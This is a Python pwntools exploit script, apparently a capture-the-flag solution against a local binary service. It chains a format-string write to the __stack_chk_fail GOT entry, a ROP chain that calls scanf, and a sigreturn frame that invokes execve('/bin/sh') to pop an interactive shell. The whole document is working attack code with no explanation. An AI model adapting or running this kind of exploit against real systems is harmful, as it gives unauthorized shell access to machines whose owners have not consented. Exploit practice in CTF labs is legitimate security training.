from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "localhost"
    port = 30002
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(verbose=True):
    s = r.recv()
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(r, s, new_line=True):
    recvuntil(r)
    if new_line:
        sendline(s)
    else:
        send(s)

got_stack_check_fail = 0x404018
got_scanf = 0x404020

syscall = 0x40118f
ret     = 0x401202
scanf   = 0x401040
pop_rdi = 0x4012c3
pop_rsi_r15 = 0x4012c1


dummybuf = got_stack_check_fail - 8
binsh   = got_scanf + 8
arg15   = got_scanf + 16

scanf_plt_6 = 0x401046

wait_for_attach()
sendline('%s %7$s\x00' + p64(got_stack_check_fail))

rop = [
        pop_rsi_r15,
        dummybuf,
        dummybuf,
        pop_rdi,
        arg15,
        scanf,
        syscall,
        ]
frame = [
        'AAAAAAAA' * 5, # uc_flags - ss_size
        'AAAAAAAA' * 8, # r8-r15
        p64(binsh),     # rdi
        p64(0),         # rsi
        p64(0) * 2,     # rbp, rbx
        p64(0),         # rdx
        p64(59),        # rax
        p64(0) * 2,     # rcx, rsp
        p64(syscall),   # rip
        p64(0),         # eflags
        p64(0x33),      # csgsfs
        'AAAAAAAA' * 4,
        p64(0)          # &fpstate
        ]

payload = ''.join(map(p64, rop)) + ''.join(frame)
sendline('A' * 24 + payload)
sendline(p64(ret) + p64(scanf_plt_6) + "/bin/sh\x00" + "%1$dA" * 15)
sendline('A'.join(map(str, range(15))) + 'A')
interactive()
